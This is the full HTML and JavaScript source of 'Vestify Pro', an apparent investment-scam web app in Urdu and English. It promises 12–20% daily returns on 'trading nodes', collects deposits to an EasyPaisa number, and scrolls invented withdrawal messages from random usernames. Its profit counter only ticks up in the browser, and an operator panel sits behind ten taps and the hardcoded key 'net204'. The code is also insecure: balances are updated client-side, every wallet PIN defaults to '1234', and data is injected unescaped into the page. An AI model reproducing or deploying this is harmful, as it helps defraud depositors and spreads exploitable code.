<html lang="ur" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>Vestify Pro - Trading Evolution</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&display=swap');
        :root { --binance-yellow: #F3BA2F; --bg-dark: #0B0E11; --card-bg: #1E2329; }
        body { font-family: 'Space Grotesk', sans-serif; background: var(--bg-dark); color: #EAECEF; margin: 0; overflow-x: hidden; text-align: right; }
        .glass-card { background: var(--card-bg); border: 1px solid rgba(255,255,255,0.05); border-radius: 20px; }
        .trading-btn { background: var(--binance-yellow); color: black; font-weight: 700; border-radius: 12px; transition: 0.3s; }
        .trading-btn:active { transform: scale(0.95); }
        .page { display: none; padding: 15px; animation: fadeIn 0.5s ease; padding-bottom: 100px; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { background: rgba(30, 35, 41, 0.95); backdrop-filter: blur(10px); border-top: 1px solid rgba(255,255,255,0.1); position: fixed; bottom: 0; width: 100%; height: 75px; z-index: 1000; display: flex; justify-content: space-around; align-items: center; flex-direction: row-reverse; }
        .nav-active { color: var(--binance-yellow); }
        #wheel { width: 280px; height: 280px; border-radius: 50%; border: 10px solid var(--binance-yellow); transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1); filter: drop-shadow(0 0 20px rgba(243,186,47,0.2)); }
        .timer-box { background: rgba(243, 186, 47, 0.1); color: var(--binance-yellow); padding: 5px 12px; border-radius: 8px; font-size: 12px; font-weight: bold; border: 1px solid rgba(243,186,47,0.2); }
        .ticker { background: rgba(243, 186, 47, 0.05); color: var(--binance-yellow); padding: 8px; font-size: 10px; font-weight: bold; overflow: hidden; white-space: nowrap; }
        .ticker-text { display: inline-block; animation: scroll 25s linear infinite; }
        @keyframes scroll { from { transform: translateX(100%); } to { transform: translateX(-100%); } }
    </style>
</head>
<body>

    <header class="p-4 flex justify-between items-center sticky top-0 bg-[#0B0E11]/80 backdrop-blur-md z-[1001]">
        <div class="flex items-center gap-3 flex-row-reverse">
            <img id="user-photo" onclick="handleAdminTap()" class="w-10 h-10 rounded-full border border-yellow-500/50 cursor-pointer" src="https://via.placeholder.com/40">
            <div class="text-right">
                <p id="user-name" class="text-[10px] font-bold opacity-60">SYNCING...</p>
                <p class="text-xs font-black text-yellow-500">PRO TRADER</p>
            </div>
        </div>
        <div class="bg-green-500/10 text-green-500 text-[10px] px-3 py-1 rounded-full font-bold">● LIVE MARKET</div>
    </header>

    <div class="ticker">
        <div class="ticker-text" id="ticker-content">⚡ ممبر @User492 نے ₨ 12,500 کا منافع نکلوایا • ایجنٹ 204 ہیلپ ڈیسک آن لائن ہے • ویسٹی فائی ٹریڈنگ نوڈس لائیو ہیں ⚡</div>
    </div>

    <main id="app-ui">
        <div id="p-home" class="page active-page">
            <div class="glass-card p-6 mb-6">
                <p class="text-xs font-bold opacity-50 mb-2">ESTIMATED BALANCE (PKR)</p>
                <h1 id="v-bal" class="text-4xl font-black italic tracking-tighter mb-2">₨ 0.00</h1>
                <p class="text-[10px] text-green-500 font-bold mb-6">+₨ <span id="live-profit">0.0000</span> Live Profit</p>
                <div class="grid grid-cols-2 gap-3">
                    <button onclick="showPage('finance')" class="trading-btn py-3 text-xs uppercase">Deposit</button>
                    <button onclick="showPage('withdraw')" class="bg-[#2B3139] py-3 rounded-xl text-xs font-bold uppercase">Withdraw</button>
                </div>
            </div>

            <div class="flex gap-4 mb-6 border-b border-white/5 pb-2">
                <button id="btn-n" onclick="renderPlans('normal')" class="text-sm font-bold text-yellow-500">Normal Nodes</button>
                <button id="btn-s" onclick="renderPlans('special')" class="text-sm font-bold opacity-40">VIP Special</button>
            </div>
            <div id="plans-grid" class="space-y-4"></div>
        </div>

        <div id="p-spin" class="page text-center">
            <h2 class="text-xl font-black mb-8 text-yellow-500 uppercase tracking-widest">Golden Spin Wheel</h2>
            <div class="relative flex justify-center mb-10">
                <div class="absolute -top-4 text-yellow-500 z-10"><i class="fa-solid fa-caret-down text-3xl"></i></div>
                <img id="wheel" src="https://i.ibb.co/3sS7z9y/spin-wheel-pro.png">
            </div>
            <div id="timer-container" class="mb-6 hidden">
                <p class="text-[10px] mb-2 opacity-50 uppercase">Next Free Spin In</p>
                <div id="spin-timer" class="timer-box inline-block">00:00:00</div>
            </div>
            <button id="spin-btn" onclick="executeSpin()" class="w-full trading-btn py-5 text-sm">SPIN NOW (₨ 50)</button>
        </div>

        <div id="p-finance" class="page">
            <h2 class="text-xl font-black mb-6">Deposit Funds</h2>
            <div class="glass-card p-6 space-y-4">
                <div class="bg-yellow-500/10 p-4 rounded-xl border border-yellow-500/20 text-center">
                    <p class="text-[10px] opacity-50 mb-1">EasyPaisa (Official)</p>
                    <p class="text-lg font-black text-yellow-500">03379827882</p>
                </div>
                <input id="d-amt" type="number" placeholder="رقم" class="w-full bg-[#2B3139] p-4 rounded-xl text-sm outline-none border border-white/5">
                <input id="d-tid" type="text" placeholder="Transaction ID (TID)" class="w-full bg-[#2B3139] p-4 rounded-xl text-sm outline-none border border-white/5">
                <button onclick="submitTx('Deposit')" class="w-full trading-btn py-4 text-xs">SUBMIT REQUEST</button>
            </div>
        </div>

        <div id="p-withdraw" class="page">
            <h2 class="text-xl font-black mb-6">Withdraw Funds</h2>
            <div class="glass-card p-6 space-y-4">
                <input id="w-num" type="text" placeholder="EasyPaisa/JazzCash Number" class="w-full bg-[#2B3139] p-4 rounded-xl text-sm outline-none border border-white/5">
                <input id="w-amt" type="number" placeholder="رقم" class="w-full bg-[#2B3139] p-4 rounded-xl text-sm outline-none border border-white/5">
                <input id="w-pin" type="password" maxlength="4" placeholder="Wallet PIN" class="w-full bg-[#2B3139] p-4 rounded-xl text-center tracking-[10px] font-black outline-none border border-white/5">
                <button onclick="handleWithdraw()" class="w-full trading-btn py-4 text-xs">WITHDRAW NOW</button>
            </div>
        </div>

        <div id="p-history" class="page">
            <h2 class="text-xl font-black mb-6">Trade History</h2>
            <div id="history-list" class="space-y-3"></div>
        </div>
    </main>

    <div id="admin-ui" class="hidden fixed inset-0 z-[5000] bg-black p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-xl font-black">ADMIN CONTROL</h2>
            <button onclick="closeAdmin()" class="bg-red-500 px-4 py-1 rounded text-xs font-bold">EXIT</button>
        </div>
        <div id="adm-list" class="space-y-4"></div>
    </div>

    <nav class="nav-bar">
        <button onclick="showPage('home')" class="nav-active"><i class="fa-solid fa-chart-line text-lg"></i><p class="text-[8px] font-bold">MARKET</p></button>
        <button onclick="showPage('spin')"><i class="fa-solid fa-dharmachakra text-lg opacity-40"></i><p class="text-[8px] font-bold opacity-40">SPIN</p></button>
        <button onclick="showPage('history')"><i class="fa-solid fa-receipt text-lg opacity-40"></i><p class="text-[8px] font-bold opacity-40">HISTORY</p></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyC9ofJ1KxRXHnxilpU9gyI87D3BSOZ9v1g", authDomain: "vestify-991f2.firebaseapp.com", projectId: "vestify-991f2", storageBucket: "vestify-991f2.firebasestorage.app", messagingSenderId: "799007097733", appId: "1:799007097733:web:ed3b35b6c4e51dc2e7baec" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore(), auth = firebase.auth();
        let userObj = null, currentRot = 0, tapCount = 0;

        auth.onAuthStateChanged(async user => {
            if(user) {
                document.getElementById('user-photo').src = user.photoURL;
                document.getElementById('user-name').innerText = user.displayName;
                const userRef = db.collection("users").doc(user.displayName);
                const doc = await userRef.get();
                if(!doc.exists) await userRef.set({ balance: 0, lastSpin: 0, walletPin: "1234", dailyProfit: 0 });
                syncUser(user.displayName);
                renderPlans('normal');
                loadHistory(user.displayName);
                startTicker();
            } else { auth.signInWithPopup(new firebase.auth.GoogleAuthProvider()); }
        });

        function syncUser(name) {
            db.collection("users").doc(name).onSnapshot(doc => {
                userObj = doc.data();
                document.getElementById('v-bal').innerText = "₨ " + (userObj.balance || 0).toLocaleString();
                startLiveProfit(userObj.dailyProfit || 0);
            });
        }

        function renderPlans(type) {
            let h = ""; let start = type === 'normal' ? 200 : 5000;
            const imgs = ["https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400", "https://images.unsplash.com/photo-1642104704074-907c0698cbd9?w=400"];
            for(let i=1; i<=8; i++) {
                let cost = start + (i * (type === 'normal' ? 400 : 5000));
                let daily = Math.floor(cost * (type === 'normal' ? 0.12 : 0.20));
                h += `
                <div class="glass-card overflow-hidden border-yellow-500/10">
                    <img src="${imgs[i%2]}" class="w-full h-24 object-cover opacity-40">
                    <div class="p-5">
                        <div class="flex justify-between items-center mb-4">
                            <div><p class="text-[9px] font-bold text-yellow-500 uppercase">Node v.${i}</p><h3 class="text-2xl font-black">₨ ${cost.toLocaleString()}</h3></div>
                            <div class="text-right"><p class="text-xs text-green-500 font-bold">₨ ${daily}/Day</p><p class="text-[8px] opacity-40">Term: 30 Days</p></div>
                        </div>
                        <button onclick="invest(${cost}, ${daily})" class="w-full bg-white/5 py-3 rounded-xl text-[10px] font-bold hover:bg-yellow-500 hover:text-black">ACTIVATE NODE</button>
                    </div>
                </div>`;
            }
            document.getElementById('plans-grid').innerHTML = h;
            document.getElementById('btn-n').style.opacity = type === 'normal' ? '1' : '0.4';
            document.getElementById('btn-s').style.opacity = type === 'special' ? '1' : '0.4';
        }

        async function invest(cost, daily) {
            if(userObj.balance < cost) return alert("بیلنس کم ہے!");
            if(confirm("Confirm Investment?")) {
                await db.collection("users").doc(auth.currentUser.displayName).update({
                    balance: firebase.firestore.FieldValue.increment(-cost),
                    dailyProfit: firebase.firestore.FieldValue.increment(daily)
                });
                await db.collection("txs").add({ user: auth.currentUser.displayName, amount: cost, type: "Investment", status: "Approved", time: Date.now() });
                alert("Activated!");
            }
        }

        async function executeSpin() {
            const now = Date.now(), last = userObj.lastSpin || 0, isFree = (now - last) > 86400000, cost = isFree ? 0 : 50;
            if(!isFree && userObj.balance < 50) return alert("Need ₨ 50!");
            const prizes = [2, 10, 5, 100, 2, 20, 5, 50]; const idx = Math.floor(Math.random()*8);
            currentRot += 3600 + (idx * 45); document.getElementById('wheel').style.transform = `rotate(${currentRot}deg)`;
            setTimeout(async () => {
                await db.collection("users").doc(auth.currentUser.displayName).update({ balance: firebase.firestore.FieldValue.increment(prizes[idx] - cost), lastSpin: isFree ? now : last });
                alert(`Won ₨ ${prizes[idx]}!`);
            }, 5000);
        }

        function startLiveProfit(daily) {
            const secProfit = daily / 86400;
            setInterval(() => {
                let curr = parseFloat(document.getElementById('live-profit').innerText);
                document.getElementById('live-profit').innerText = (curr + secProfit).toFixed(4);
            }, 1000);
        }

        function updateSpinTimer() {
            if(!userObj || !userObj.lastSpin) return;
            const diff = (userObj.lastSpin + 86400000) - Date.now();
            if(diff > 0) {
                document.getElementById('timer-container').classList.remove('hidden');
                document.getElementById('spin-btn').innerText = "SPIN COST: ₨ 50";
                const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                document.getElementById('spin-timer').innerText = `${h}:${m}:${s}`;
            } else {
                document.getElementById('timer-container').classList.add('hidden');
                document.getElementById('spin-btn').innerText = "FREE SPIN AVAILABLE";
            }
        }
        setInterval(updateSpinTimer, 1000);

        async function submitTx(type) {
            const amt = Number(document.getElementById('d-amt').value), tid = document.getElementById('d-tid').value;
            if(!amt || !tid) return alert("Fill all fields");
            await db.collection("txs").add({ user: auth.currentUser.displayName, amount: amt, tid: tid, type: type, status: "Pending", time: Date.now() });
            alert("Sent!");
        }

        async function handleWithdraw() {
            const pin = document.getElementById('w-pin').value, amt = Number(document.getElementById('w-amt').value);
            if(pin !== userObj.walletPin) return alert("Wrong PIN");
            if(amt > userObj.balance) return alert("Low balance");
            await db.collection("txs").add({ user: auth.currentUser.displayName, amount: amt, type: "Withdrawal", status: "Pending", time: Date.now() });
            alert("Requested!");
        }

        function loadHistory(name) {
            db.collection("txs").where("user","==",name).orderBy("time","desc").onSnapshot(s => {
                let h = ""; s.forEach(doc => {
                    const d = doc.data();
                    h += `<div class="glass-card p-4 flex justify-between"><div><p class="text-xs font-bold">${d.type}</p><p class="text-[8px] opacity-40">${new Date(d.time).toLocaleDateString()}</p></div><div class="text-left"><p class="text-sm font-black">₨ ${d.amount}</p><p class="text-[8px] ${d.status==='Approved'?'text-green-500':'text-yellow-500'}">${d.status}</p></div></div>`;
                });
                document.getElementById('history-list').innerHTML = h || "No History";
            });
        }

        function handleAdminTap() { tapCount++; if(tapCount>=10) { if(prompt("Key")==="net204") loadAdmin(); tapCount=0; } }
        function loadAdmin() {
            document.getElementById('admin-ui').classList.remove('hidden');
            db.collection("txs").where("status","==","Pending").onSnapshot(s => {
                let h = ""; s.forEach(doc => {
                    const d = doc.data();
                    h += `<div class="glass-card p-4 mb-3"><p class="text-xs">${d.user} (${d.type})</p><h2 class="text-xl font-bold">₨ ${d.amount}</h2><button onclick="approve('${doc.id}','${d.user}',${d.amount})" class="w-full bg-green-600 py-2 mt-2 rounded-lg text-xs font-bold">APPROVE</button></div>`;
                });
                document.getElementById('adm-list').innerHTML = h || "All Clean";
            });
        }
        async function approve(id, u, a) {
            await db.collection("txs").doc(id).update({status:"Approved"});
            await db.collection("users").doc(u).update({balance: firebase.firestore.FieldValue.increment(a)});
        }
        function closeAdmin() { document.getElementById('admin-ui').classList.add('hidden'); }
        function showPage(p) {
            document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page'));
            document.getElementById('p-'+p).classList.add('active-page');
            document.querySelectorAll('nav button').forEach(b => b.classList.remove('nav-active'));
        }
        function startTicker() {
            const n = ["@Ali_78", "@Zain_92", "@Sara_00", "@Khan_X"];
            setInterval(() => {
                const name = n[Math.floor(Math.random()*n.length)];
                document.getElementById('ticker-content').innerText = `⚡ ${name} ne ₨ ${Math.floor(Math.random()*5000+500)} withdraw kiye • ایجنٹ 204 آن لائن ہے ⚡`;
            }, 8000);
        }
    </script>
</body>
</html>
